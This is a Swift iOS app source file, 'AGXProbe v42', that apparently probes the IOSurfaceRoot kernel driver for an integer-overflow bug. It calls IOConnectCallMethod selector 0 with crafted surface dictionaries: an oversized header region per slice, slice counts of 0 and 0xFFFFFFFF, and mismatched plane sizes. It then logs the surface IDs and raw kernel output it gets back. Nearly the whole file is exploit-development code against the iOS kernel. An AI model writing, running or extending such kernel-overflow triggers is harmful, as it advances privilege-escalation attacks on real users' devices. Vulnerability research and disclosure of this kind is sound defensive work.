import SwiftUI
import Darwin

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v42 — IOSurface size validation (13 Pro)").font(.headline)
            Text("IOSurfacePlaneHeaderRegionBytesPerSlice overflow test").font(.caption2).foregroundColor(.secondary)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v42")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func log(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    private func stripNul(_ data: Data, tag: String) -> Data? {
        guard let s = String(data: data, encoding: .utf8) else { return nil }
        guard let a = s.range(of: "<\(tag)"),
              let b = s.range(of: "</\(tag)>", options: .backwards) else { return nil }
        return (String(s[a.lowerBound..<b.upperBound]).data(using: .utf8) ?? Data()) + Data([0])
    }

    private func xmlNul(_ d: Any) -> Data? {
        guard let data = try? PropertyListSerialization.data(fromPropertyList: d, format: .xml, options: 0) else { return nil }
        return data + Data([0])
    }

    private func num(_ v: UInt64) -> Int64 { Int64(bitPattern: v) }

    private func plane(off: UInt64, size: UInt64, bpr: UInt64, bpe: UInt64) -> [String: Any] {
        return [
            "IOSurfacePlaneWidth": 64,
            "IOSurfacePlaneHeight": 64,
            "IOSurfacePlaneBytesPerRow": num(bpr),
            "IOSurfacePlaneBytesPerElement": num(bpe),
            "IOSurfacePlaneOffset": num(off),
            "IOSurfacePlaneSize": num(size),
        ]
    }

    private func surf(_ alloc: UInt64, _ planes: [[String: Any]], _ extra: [String: Any]) -> [String: Any] {
        var d: [String: Any] = [
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfaceBytesPerRow": 256,
            "IOSurfaceAllocSize": num(alloc),
            "IOSurfacePixelFormat": 0x42475241,
            "IOSurfacePlaneInfo": planes,
        ]
        for (k, v) in extra { d[k] = v }
        return d
    }

    private func callIO(_ conn: io_connect_t, sel: UInt32, scalars: [UInt64], sdata: [UInt8], outSize: Int) -> (UInt32, [UInt8]) {
        var inScalar = [UInt64](repeating: 0, count: 4)
        for i in 0..<scalars.count { inScalar[i] = scalars[i] }
        var outScalar = [UInt64](repeating: 0, count: 8)
        var outScalarCount: UInt32 = 0
        var outBuff = [UInt8](repeating: 0xCC, count: max(outSize, 1))
        var outSz: Int = outSize
        let kr: Int32 = sdata.withUnsafeBytes { raw in
            outBuff.withUnsafeMutableBytes { ob in
                IOConnectCallMethod(conn, sel,
                                    &inScalar, UInt32(scalars.count),
                                    raw.baseAddress, sdata.count,
                                    &outScalar, &outScalarCount,
                                    ob.baseAddress, &outSz)
            }
        }
        let k = UInt32(bitPattern: kr)
        var outBytes = [UInt8](outBuff.prefix(Int(outSz)))
        return (k, outBytes)
    }

    private func idFrom(_ out: [UInt8]) -> UInt32? {
        guard out.count >= 0x1C else { return nil }
        return UInt32(out[0x18]) | (UInt32(out[0x19]) << 8) | (UInt32(out[0x1A]) << 16) | (UInt32(out[0x1B]) << 24)
    }

    private func u64(_ out: [UInt8], _ o: Int) -> UInt64 {
        guard out.count >= o + 8 else { return 0 }
        var v: UInt64 = 0
        for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
        return v
    }

    private func probeService(_ name: String, _ type: UInt32) {
        let service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching(name))
        guard service != 0 else { log("\(name): service NOT FOUND"); return }
        log("\(name): service found")
        var conn: io_connect_t = 0
        let okr = IOServiceOpen(service, mach_task_self_, type, &conn)
        IOObjectRelease(service)
        if okr != 0 { log("\(name) type=\(type): IOServiceOpen kr=0x\(String(okr, radix:16))"); return }
        log("\(name) type=\(type): IOServiceOpen ok conn=0x\(String(conn, radix:16))")
        defer { IOServiceClose(conn) }

        log("\n--- sel0: IOSurfacePlaneHeaderRegionBytesPerSlice overflow ---")

        // sel0: HBR=0x40000000 + sliceCount=4 (SKVLENT case)
        var extra: [String: Any] = [
            "IOSurfaceSliceCount": 4,
            "IOSurfacePlaneDataRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneHeaderRegionBytesPerSlice": num(0x40000000),
            "IOSurfacePlaneSize": num(0x10000),
        ]
        let dict0 = surf(0x4000, [plane(off: 0, size: 0x1000, bpr: 256, bpe: 4)], extra)
        guard let full0 = xmlNul(dict0), let p0 = stripNul(full0, tag: "dict") else {
            log("sel0 HBR: serialize failed"); return
        }
        let p0Bytes = Array(p0)
        let (k0, out0) = callIO(conn, sel: 0, scalars: [0], sdata: p0Bytes, outSize: 0xC68)
        log("sel0 HBR=0x40000000: kr=0x\(String(k0, radix:16)) outSz=\(out0.count)")
        if k0 == 0, let sid = idFrom(out0) {
            log("  surface id=\(sid) a0=0x\(String(u64(out0, 0x00), radix:16)) alloc=0x\(String(u64(out0, 0x20), radix:16)) planes=\(u64(out0, 0x58))")
        } else {
            log("  create FAILED - no surface created")
        }

        log("\n--- sel0: sliceCount=1 ---")
        var extra1: [String: Any] = [
            "IOSurfaceSliceCount": 1,
            "IOSurfacePlaneDataRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneHeaderRegionBytesPerSlice": num(0x40000000),
            "IOSurfacePlaneSize": num(0x10000),
        ]
        let dict1 = surf(0x4000, [plane(off: 0, size: 0x1000, bpr: 256, bpe: 4)], extra1)
        guard let full1 = xmlNul(dict1), let p1 = stripNul(full1, tag: "dict") else {
            log("sel0 sliceCount=1: serialize failed"); return
        }
        let p1Bytes = Array(p1)
        let (k1, out1) = callIO(conn, sel: 0, scalars: [0], sdata: p1Bytes, outSize: 0xC68)
        log("sel0 sliceCount=1: kr=0x\(String(k1, radix:16)) outSz=\(out1.count)")
        if k1 == 0, let sid1 = idFrom(out1) {
            log("  surface id=\(sid1)")
        }

        log("\n--- sel0: sliceCount=4, size=0x10000 ---")
        var e6: [String: Any] = [
            "IOSurfaceSliceCount": 4,
            "IOSurfacePlaneDataRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneHeaderRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneSize": num(0x10000),
        ]
        let d6 = surf(0x4000, [plane(off: 0, size: 0x10000, bpr: 256, bpe: 4)], e6)
        guard let f6 = xmlNul(d6), let p6 = stripNul(f6, tag: "dict") else { return }
        let p6Bytes = Array(p6)
        let (k6, out6) = callIO(conn, sel: 0, scalars: [0], sdata: p6Bytes, outSize: 0xC68)
        log("sel0 size=0x10000: kr=0x\(String(k6, radix:16)) outSz=\(out6.count)")
        if k6 == 0, let sid6 = idFrom(out6) {
            log("  surface id=\(sid6) a0=0x\(String(u64(out6, 0x00), radix:16))")
        }

        log("\n--- sel0: sliceCount=4, headerRegion=0x10000 ---")
        var extra2: [String: Any] = [
            "IOSurfaceSliceCount": 4,
            "IOSurfacePlaneDataRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneHeaderRegionBytesPerSlice": num(0x10000),
            "IOSurfacePlaneSize": num(0x10000),
        ]
        let dict2 = surf(0x4000, [plane(off: 0, size: 0x1000, bpr: 256, bpe: 4)], extra2)
        guard let full2 = xmlNul(dict2), let p2 = stripNul(full2, tag: "dict") else { return }
        let p2Bytes = Array(p2)
        let (k2, out2) = callIO(conn, sel: 0, scalars: [0], sdata: p2Bytes, outSize: 0xC68)
        log("sel0 headerRegion=0x10000: kr=0x\(String(k2, radix:16)) outSz=\(out2.count)")
        if k2 == 0, let sid2 = idFrom(out2) {
            log("  surface id=\(sid2)")
        }

        log("\n--- sel0: sliceCount=0 ---")
        var extra3: [String: Any] = [
            "IOSurfaceSliceCount": 0,
            "IOSurfacePlaneDataRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneHeaderRegionBytesPerSlice": num(0x40000000),
            "IOSurfacePlaneSize": num(0x10000),
        ]
        let dict3 = surf(0x4000, [plane(off: 0, size: 0x1000, bpr: 256, bpe: 4)], extra3)
        guard let full3 = xmlNul(dict3), let p3 = stripNul(full3, tag: "dict") else { return }
        let p3Bytes = Array(p3)
        let (k3, out3) = callIO(conn, sel: 0, scalars: [0], sdata: p3Bytes, outSize: 0xC68)
        log("sel0 sliceCount=0: kr=0x\(String(k3, radix:16)) outSz=\(out3.count)")

        log("\n--- sel0: sliceCount=0xFFFFFFFF ---")
        var extra4: [String: Any] = [
            "IOSurfaceSliceCount": num(0xFFFFFFFF),
            "IOSurfacePlaneDataRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneHeaderRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneSize": num(0x10000),
        ]
        let dict4 = surf(0x4000, [plane(off: 0, size: 0x1000, bpr: 256, bpe: 4)], extra4)
        guard let full4 = xmlNul(dict4), let p4 = stripNul(full4, tag: "dict") else { return }
        let p4Bytes = Array(p4)
        let (k4, out4) = callIO(conn, sel: 0, scalars: [0], sdata: p4Bytes, outSize: 0xC68)
        log("sel0 sliceCount=0xFFFFFFFF: kr=0x\(String(k4, radix:16)) outSz=\(out4.count)")

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        log("=== AGXProbe v42 — IOSurface size validation (13 Pro) ===")

        probeService("IOSurfaceRoot", 0)

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
